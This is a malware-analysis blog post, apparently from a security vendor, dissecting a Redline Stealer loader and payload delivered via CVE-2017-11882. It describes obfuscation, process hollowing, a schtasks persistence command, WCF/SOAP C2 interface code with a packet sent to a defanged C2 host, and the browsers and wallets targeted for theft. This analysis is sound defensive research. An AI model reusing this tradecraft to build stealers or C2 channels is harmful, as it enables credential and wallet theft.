The embedded file with a randomized file name exploits a particular vulnerability —\n[CVE-2017-11882—to execute malicious code to deliver and execute malware on a victim’s](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-11882)\ndevice.\n\n[Part I of my analysis explained how this crafted Excel document exploits CVE-2017-11882](https://www.fortinet.com/blog/threat-research/excel-document-delivers-malware-by-exploiting-cve-2017-11882?utm_source=blog&utm_medium=blog&utm_campaign=excel-document-delivers-malware-by-exploiting-cve-2017-11882)\nand what it does when exploiting that vulnerability. An involved website\n(hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/{file name}) was found storing and delivering\nnumerous malware family samples, like Formbook and Redline. I dissected a recent\nFormbook sample from that website in part I of my analysis, including but not limited to how\nthat Formbook was downloaded and deployed on a victim’s device and what C2 servers it\ncontains in that Formbook variant.\n\n\n-----\n\nRedline (also known as Redline Stealer) is a commercial malware family designed to collect\nsensitive information from infected devices, such as saved credentials, autocomplete data,\ncredit card information, and more.\n\n**Affected platforms: Microsoft Windows**\n\n**Impacted parties: Windows Users**\n\n**Impact: Collect Sensitive Information from Victim’s Device.**\n\n**Severity level: Critical**\n\nI start part II of my analysis by examining a Redline sample collected from that same\nwebsite. In this report, you will learn how the Redline payload is extracted from the sample,\nhow it maintains persistence on the infected device, what sorts of sensitive information are\nstolen from the victim’s device, and how that stolen information is submitted to its C2 server.\n\n## Redline Loader\n\nThe Redline sample I selected is “hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/almac.exe”,\nwhich is a Redline loader. It is obfuscated by a [.NET Obfuscator called SmartAssembly](https://www.red-gate.com/products/dotnet-development/smartassembly/)\n6.9.0.114. When I analyzed this sample using a .Net debugger, I found that it has a\ncomprehensive set of obfuscation features, such as obfuscated names (class names,\nfunction names, variable names, and more), control flow obfuscation, strings encoding, and\ndeclarative obfuscation.\n\nFigure 1.1 shows the sample in a debugger with obfuscated names and entry point function\n(main() function) shown using SmartAssembly.\n\nFigure 1.1 – Redline sample with full obfuscation protection\n\nIt can be deobfuscated using the de4dot tool to get a friendlier, clean version, as shown in\nFigure 1.2.\n\nFigure 1.2 – Deobfuscated Redline sample\n\nAfter sleeping for five seconds at the start of the Redline sample (Redline loader), it loads a\ndata block from its .Net resource called “brfmdFiaha”. This is then decrypted into a PE file\nwith the key string “brfmdFiaha”, as shown in Figure 1.3, where a local variable “byte_” is\npointing to the decrypted PE file shown in the memory subtab.\n\nFigure 1.3 – Extracting and decrypting a PE file\n\nThe decrypted PE file is the payload file of this Redline variant. It then process-hollows the\ndecrypted PE file.\n\nIt dynamically loads a group of Windows APIs to process hollow the Redline payload file,\nwhich are listed in the below table.\n\n\n-----\n\ndelegate0_0.Method {Boolean Wow64GetThreadContext(IntPtr, Int32[])}\n\ndelegate1_0.Method {Boolean GetThreadContext(IntPtr, Int32[])}\n\ndelegate2_0.Method {Boolean ReadProcessMemory(IntPtr, Int32, Int32, Int32, Int32\nByRef)}\n\ndelegate3_0.Method {Int32 VirtualAllocEx(IntPtr, IntPtr, UInt32, UInt32, UInt32)}\n\ndelegate4_0.Method {Boolean WriteProcessMemory(IntPtr, Int32, Byte[], Int32, Int32\nByRef)}\n\ndelegate5_0.Method {Boolean Wow64SetThreadContext(IntPtr, Int32[])}\n\ndelegate6_0.Method {Boolean SetThreadContext(IntPtr, Int32[])}\n\ndelegate7_0.Method {UInt32 ResumeThread(IntPtr)}\n\ndelegate8_0.Method {Boolean CreateProcessAsUser(IntPtr, System.String,\nSystem.String, IntPtr, IntPtr, Boolean, UInt32, IntPtr, System.String,\nStruct1 ByRef, Struct0 ByRef)} System.Reflection.MethodInfo\n{System.Reflection.RuntimeMethodInfo}\n\nIt calls the API CreateProcessAsUser() with a CreateFlag of CREATE_SUSPENDED (0x4) to\ncreate a suspended duplicated process of the Redline loader. It then calls VirtualAllocEx() to\nallocate memory space in the suspended process. It then copies the entire Redline payload\nfile from the Redline loader onto it by calling the WriteProcessMemory() API. Next, it deploys\nthe copied payload file in the newly-created process, calling APIs\nWow64GetThreadContext() or GetThreadContext(), ReadProcessMemory(),\nWriteProcessMemory(), and Wow64SetThreadContext() or SetThreadContext(). Before\nexiting the Redloader loader process, it calls the API ResumeThread() to have the\nsuspended process restore running from the copied Redline payload.\n\n## Redline Persistence Mechanism\n\nThe Redline loader is also in charge of maintaining Redline persistence on the victim’s\ndevice. Unlike Formbook being added into the auto-run group in the system registry, Redline\nuses the system Task Scheduler.\n\nThe Redline loader calls the following command-line command.\n\n\n-----\n\n_cmd.exe /C schtasks /create /sc minute /mo 1 /tn Nafdfnasia /tr C:\\Users\\{user_\n_name}\\AppData\\Roaming\\packtracer.exe'\" /f_\n\nIt executes “schtasks.exe” with parameters to create a new task item with a task named\n“Nafdfnasia”, which is triggered by the Task Scheduler every minute to execute a file called\n“packtracer.exe”. Figure 2.1 is the screenshot of this added Redline task.\n\nFigure 2.1 – Details of the Redline task being added to the Task Scheduler\n\nSome may wonder what this “packtracer.exe” file is. After executing the above command-line\ncommand, it performed a DOS “copy” command to duplicate the Redline loader itself and\nwas saved as “%AppData%/packtracer.exe” file, which is a hardcoded constant string in the\nRedline loader.\n\nOnce that is done, the Redline loader that extracts and runs the Redline payload will be\nexecuted by the Windows Task Scheduler every minute.\n\n## Diving into the Redline Payload File\n\nI dumped the Redline payload file from memory for deeper analysis. It’s a .Net frameworkbased program without any obfuscation. By going through its code, I determined that the\ncommunication between Redline and its C2 server was built based on the WCF (Windows\nCommunication Foundation) service. It builds a channel between the client and server, with\nthe data being transferred on that channel sealed inside an XML-SOAP (Simple Object\nAccess Protocol) protocol by a class ChannelFactory.\n\nThe following is a code segment that creates such a channel.\n\nChannelFactory<IRemoteEndpoint> channelFactory = new ChannelFactory<IRemoteEndpoint>\n\n(\n\nSystemInfoHelper.CreateBind(),\n\nnew EndpointAddress(\"http://\" + address + \"/\")\n\n);\n\nthis.serviceInterfacce = channelFactory.CreateChannel();\n\nWhere:\n\nThe IRemoteEndpoint used to create a channel factory object is an interface\nimplemented in the C2 server program.\nThe first parameter returned by “CreateBind()” specifies that Redline use HTTP as the\ntransport for sending SOAP 1 1 messages\n\n\n-----\n\nThe second parameter is that the C2 server uses an EndpointAddress object with the\nC2 server’s information. The “address” is the C2 server address defined in a class (see\nfigure 3.1).\nBy calling the method “channelFactory.CreateChannel()”, it can create a channel (a\nTCP connection) between Redline and the C2 server. Redline can then remotely call\nand obtain return value if applicable from those IRemoteEndpoint‘s methods\nimplemented inside the C2 server program.\n\nFigure 3.1 – The definition of the C2 server and the Redline release ID\n\nBelow is the definition of the IRemoteEndpoint interface and the methods Redline uses to\ncall and communicate with its C2 server. “OperationContract” and “ServiceContract”\nattributes show they use a WCF service framework. Once the methods are called, their\nmethod names are replaced in the XML-SOAP data with a name specified in the\n“OperationContract” attribute.\n\n[ServiceContract(Name = \"Endpoint\")]\n\npublic interface IRemoteEndpoint\n\n{\n[OperationContract(Name = \"CheckConnect\")]\n\nbool CheckConnect\n\n();\n\n[OperationContract(Name = \"EnvironmentSettings\")]\n\nScanningArgs GetArguments\n\n();\n\n[OperationContract(Name = \"SetEnvironment\")]\n\nvoid VerifyScanRequest(ScanResult\n\n**user);**\n\n[OperationContract(Name = \"GetUpdates\")]\n\nIList<UpdateTask> GetUpdates(ScanResult\n\n**user);**\n\n[OperationContract(Name = \"VerifyUpdate\")]\n\nvoid VerifyUpdate(ScanResult user, int updateId);\n\n}\n\n\n-----\n\nCheckConnect() checks to see if the connection status is OK. GetArguments() asks the C2\nserver which sensitive data it needs to steal from the victim’s device. VerifyScanRequest() is\nresponsible for submitting the stolen information to its C2 server. GetUpdates() updates the\nstolen information to the C2 server and asks for additional tasks from the C2 server.\nVerifyUpdate() is used to inform the C2 server that a task asked for by calling GetUpdates()\nhas been completed.\n\nLet’s check out a real instance of calling these methods. Imagine that Redline calls “result =\nthis.serviceInterfacce.CheckConnect();”.\n\nThe request packet is shown below. Its body is sealed in SOAP:\n\nPOST / HTTP/1.1\n\nContent-Type: text/xml; charset=utf-8\n\n**SOAPAction: \"http://tempuri.org/Endpoint/CheckConnect\"**\n\nHost: sinmac[.]duckdns[.]org:2667\n\nContent-Length: 137\n\nExpect: 100-continue\n\nAccept-Encoding: gzip, deflate\n\nConnection: Keep-Alive\n\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>\n<CheckConnect xmlns=\"http://tempuri.org/\"/></s:Body></s:Envelope>\n\nThis is the response packet:\n\nHTTP/1.1 200 OK\n\nContent-Length: 212\n\nContent-Type: text/xml; charset=utf-8\n\nServer: Microsoft-HTTPAPI/2.0\n\nDate: Tue, 20 Sep 2022 18:45:28 GMT\n\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>\n<CheckConnectResponse xmlns=\"http://tempuri.org/\">\n<CheckConnectResult>true</CheckConnectResult></CheckConnectResponse>\n</s:Body></s:Envelope>\n\n\n-----\n\nFrom the body portion of the packet, the return value of the method implemented in the C2\nserver is “true”, which is carried within the XML tag “<CheckConnectResult>”.\n\nAll packets between the Redline and its C2 server are transferred in the same way and\nthrough that created channel.\n\n## Stealing Sensitive Information\n\nLet’s proceed to checking on how Redline steals sensitive information from a victim’s\ninfected device. Redline calls the remote method “GetArguments()” to obtain the tasks its C2\nserver wants it to perform. This includes setting switch flags for whether or not to steal data\nfrom targeted software and for the web browser folder paths where the victim’s personal data\nis stored.\n\nFigure 4.1 – Values returned from a remote method GetArguments()\n\nFigure 4.1 is a debugger screenshot that includes the values of variable “settings” obtained\nfrom the XML SOAP data that replied from the C2 server when the GetArguments() method\nhad been called.\n\nRedline has designed 22 local methods for stealing sensitive information from a victim’s\ndevice based on switch flags and file path information that the “settings” variable carries.\n\nBased on research, Redline can collect information from the following:\n\n**Web Browsers:**\n\nChrome, Edge, Firefox, Opera, Waterfox, K-Meleon, IceDragon, Cyberfox, BlackHaw, Pale\nMoon, Iridium, 7Star, ChromePlus, CentBrowser, Vivaldi, Chedot, Kometa, Elements\nBrowser, Epic Privacy Browser, Sleipnir, Citrio, Coowon, liebao, QIP Surf, Dragon, Amigo,\nTorch, Yandex, Comodo, 360Browser, Maxthon3, K-Melon, Sputnik, Nichrome, CocCoc,\nChromodo, Brave-Browser, CryptoTab Browser, and all other browsers built on Chromium\nproject.\n\n**Email Clients:**\n\nMail.Ru and Thunderbird.\n\n**Social, Game, IM Clients:**\n\nBattle.net, Steam, Discord, and Telegram.\n\n**FTP and VPN Clients:**\n\nUran, ProtonVPN, FileZilla, OpenVPN, and NordVPN.\n\n**Digital Wallet:**\n\n\n-----\n\nArmory Wallet, YoroiWallet Wallet, Coinomi Wallet, Electrum Wallet, Ethereum, Exodus,\nJaxxxLiberty Wallet, TronLink, Nifty Wallet, MetaMask, MathWallet, Coinbase, BinanceChain,\nBraveWallet, GuardaWallet, EqualWallet, JaxxxLiberty, BitAppWallet, iWallet, Wombat,\nAtomicWallet, MewCx, GuildWallet, SaturnWallet, RoninWallet, and more.\n\nRedline can steal victims' personal information, including saved credentials, auto-fills, credit\ncard information, tokens, private keys, cookies, profiles, logs, and more, from the default\nsoftware clients listed above. It also obtains all files from the victim’s Desktop and Document\nfolders as long as their filename contains “txt”, “doc”, “key”, “wallet”, or “seed”.\n\nBesides collecting sensitive information, it also collects a screenshot of the victim’s screen\nand the basic system and hardware information of the infected device, including OS version,\nprocessor information, GraphicCard information, monitor information, total RAM, public IP\naddress, location, UserName, default language, TimeZone, installed programs, installed\nAntiVirus, AntiSpyWare and Firewalls, and a list of active processes.\n\nFigure 4.2 – View of a request packet with stolen data\n\nThis is a view of the packet with the stolen data in SOAP being submitted to its C2 server. It\nis sent once Redline calls the remote method\n“this.serviceInterfacce.VerifyScanRequest(result);”, where the parameter “result” holds all the\nstolen data listed above from the victim’s device. As per the method definition of\nVerifyScanRequest(), it is given another name—\"SetEnvironment\"—in WCF. Henceforth, it\nuses \"SetEnvironment\" in the packet, as shown in Figure 4.2.\n\n## The Redline C2 Server Side Tool\n\nFor research purposes, I managed to obtain one C2 server program. As long as the Redline\nC2 server receives stolen information from a Redline system, it shows one item on its Logs\nsubtab, and the attacker can view the stolen data through its menu, as shown in Figure 5.1.\n\nFigure 5.1 – C2 server program interface\n\nIt uses HWID to identify each victim, which is an MD5 hash code made of the victim’s\nDomainName, UserName, and the disk drive’s serial number.\n\nFigure 5.2 displays a screenshot of the Redline settings subtab showing the major features\nwith which the attacker can enable or disable features and add or remove files, paths, and\nfilters to be scanned on the victim’s device.\n\nFigure 5.2 – Features that Redline provides\n\nOnce “System Info” in the context menu is clicked, a pop-up window displays stolen system\ninformation on the right and screenshots on the left (Figure 5.3).\n\n\n-----\n\nFigure 5.3 – System Info\n\nFigure 5.4 shows the collected credentials of the FTP clients that Redline has stolen from my\ntest machine.\n\nFigure 5.4 – FTP clients' credentials\n\nFigure 5.5 – Statistics subtab\n\nThe server-side tool also provides a statistics feature to summarize the information received\nfrom its victims.\n\n## Fortinet Protections\n\nFortinet customers are already protected from this Redline variant with FortiGuard’s Web\nFiltering, IPS, and AntiVirus services as follows:\n\nThe downloading URL and C2 server are rated as “Malicious Websites” by the FortiGuard\nWeb Filtering service.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded\nfile inside the original Excel document.\n\nFortiGuard Labs detects this Redline variant with the AV signature “MSIL/Redline.8B8C!tr “.\n\n[The FortiGuard AntiVirus service is supported by FortiGate,](https://www.fortinet.com/products/next-generation-firewall.html?utm_source=blog&utm_campaign=2018-q2-fortigate-main-page) [FortiMail, FortiClient, and](https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&utm_campaign=2018-q2-fortimail-main-page)\n[FortiEDR.
